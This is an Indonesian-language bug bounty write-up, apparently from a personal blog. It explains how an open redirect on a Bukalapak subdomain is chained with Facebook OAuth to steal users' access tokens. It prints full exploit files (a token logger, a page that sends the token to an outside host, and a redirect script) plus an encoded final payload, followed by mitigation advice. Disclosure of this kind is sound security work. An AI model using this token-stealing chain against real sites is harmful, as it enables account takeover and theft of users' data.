---
title: Open redirect & Account Takeover pada bukalapak.com
date: 2019-01-21 01:38:00 +0000
comments: true
tags:
- Bugbounty
mathjax: false
category:
- Bugbounty
private: false

---
### Open Redirect  

Open Redirect adalah kerentanan dimana aplikasi menerima input dari pengguna yang akan digunakan untuk perpindahan halaman atau redirect pada aplikasi dan tidak mempunyai filter terhadap input yang akan di gunakan sebagai redirect tersebut yang menyebabkan penyalahgunaan fitur tersebut.   

### Account Takeover 

Account Takeover adalah mengambil alih akses akun orang lain, untuk melakukan account takeover bisa menggunakan berbagai macam cara, salah satunya adalah yang akan dijelaskan pada report ini yaitu menggabungkan Open Redirect dengan Token stealing sehingga dapat mengambil alih akses terhadap akun yang dimiliki orang lain.  

###  Kesimpulan Masalah   

Open redirect yang ditemukan ada pada domain glimpse.bukalapak.com dengan parameter link, contoh open redirect nya adalah : [https://glimpse.bukalapak.com/redirect?link=https://evil.com](https://glimpse.bukalapak.com/redirect?link=https://evil.com "https://glimpse.bukalapak.com/redirect?link=https://evil.com") tapi karena bukalapak tidak menerima open redirect yang meliki impact keamanan yang kecil.  

![](/uploads/redir.PNG)

dari situ saya mencoba mengabungkan kelemahan tersebut agar bisa menjadi crictical secara dapat melakukan takeover akun yang dimiliki orang lain, saya memanfaatkan fitur login dengan facebook yang berada di url berikut:   

    https://www.facebook.com/v3.0/dialog/oauth?client_id=727108917352926&redirect_uri
    =https%3A%2F%2Fctfs.me&response_type=token

Oauth facebook memiliki 3 parameter yang seharusnya ada para requestnya yaitu **client_id** dimana **727108917352926** adalah ID milik applikasi bukalapak di facebook , kemudian **redirect_uri** adalah url yang akan menerima callback dari facebook **Yang hanya bisa di arahkan kepada domain milik bukalapak yaitu *.bukalapak.com** , karena kita sudah memiliki open redirect maka attack scenario ini dapat mudah dijalankan, jika kita menggunakan domain selain bukalapak sebagai **redirect_uri** nya maka kita akan mendapatkan error berikut :   

![](/uploads/error.PNG)

Skenario yang saya buat untuk melancarkan attack ini adalah sebagai berikut :   

![](/uploads/skenario.PNG)

saya menggunakan 3 file berikut untuk mendapatkan token dari user, tanpa adanya user interaction sama sekali hingga tokennya tersimpan di dalam log yang saya persiapkan.   

    //file save.php
    <?php
    $file = fopen("token_facebook_log.txt","a");
    fwrite($file,@$_GET['data']."\n");
    fclose($file);
    ?>
    

    //file steal.html
    <h2> 😈😈😈</h2>
    <script>
     let token = window.location.hash.substring(1);
     //alert("YOUR TOKEN IS MINE: "+token);
     const Http = new XMLHttpRequest();
     const url='https://security.ctfs.me/save.php?data='+token;
     Http.open("GET", url);
     Http.send();
     Http.onreadystatechange=(e)=>{
     console.log(Http.responseText)
     }
    </script>
    <meta http-equiv="refresh" content="1; url=https://bukalapak.com" />

    //file trusted.php
    <?php
    header("Location:
    https://www.facebook.com/v3.0/dialog/oauth?client_id=727108917352926&redirect_uri
    =https%3A%2F%2Fglimpse.bukalapak.com%2Fredirect%3Flink%3Dhttps://security.ctfs.me
    /steal.html&response_type=token&scope=email%2C+groups_access_member_info%2C+p
    ublish_to_groups%2C+user_age_range%2C+user_birthday%2C+user_events%2C+user_fri
    ends%2C+user_gender%2C+user_hometown%2C+user_likes%2C+user_link%2C+user_loca
    tion%2C+user_photos%2C+user_posts%2C+user_tagged_places%2C+user_videos%2C+pu
    blish_actions%2C+manage_pages%2C+instagram_basic");
    ?>

Untuk validasi token yang kita dapatkan ke facebook bisa menggunakan [https://developers.facebook.com/tools/debug/accesstoken/?access_token=TOKEN_HERE&version=v3.2](https://developers.facebook.com/tools/debug/accesstoken/?access_token=TOKEN_HERE&version=v3.2 "https://developers.facebook.com/tools/debug/accesstoken/?access_token=TOKEN_HERE&version=v3.2"), dan saya bisa mendapatkan token dengan waktu expired NEVER Jika origin nya menggunakan Mobile dengan authentikasi menggunakan aplikasi bukalapak.

![](/uploads/debug.PNG)  

    // Final Payload
    https://glimpse.bukalapak.com/redirect?link=%68%74%74%70%73%3a%2f%2f%73%65%6
    3%75%72%69%74%79%2e%63%74%66%73%2e%6d%65%2f%74%72%75%73%74%65%64
    %2e%70%68%70

User tidak diperlukan melakukan apapun **jika sudah terauthentikasi bukalapaknya dengan facebook** (jika belum maka applikasi bukalapak akan meminta izin ke facebook) dan kemudian token user tersebut dapat steal.

###  Saran

Untuk mitigasi celah keamanan ini bisa dengan menerapkan whitelist terhadap redirect yang ada pada glimpse.bukalapak.com atau merubah konfigurasi applikasi facebooknya agar hanya menerima domain tertentu saja, jangan ***.bukalapak.com**.

> Akhir kata semoga diantara kita tidak takut untuk sharing karena sharing tidak akan membuat kita miskin melainkan sebaliknya akan membuat kita lebih dalam segala hal, semoga hari kita menyenangkan terutama yang membaca tulisan ini :D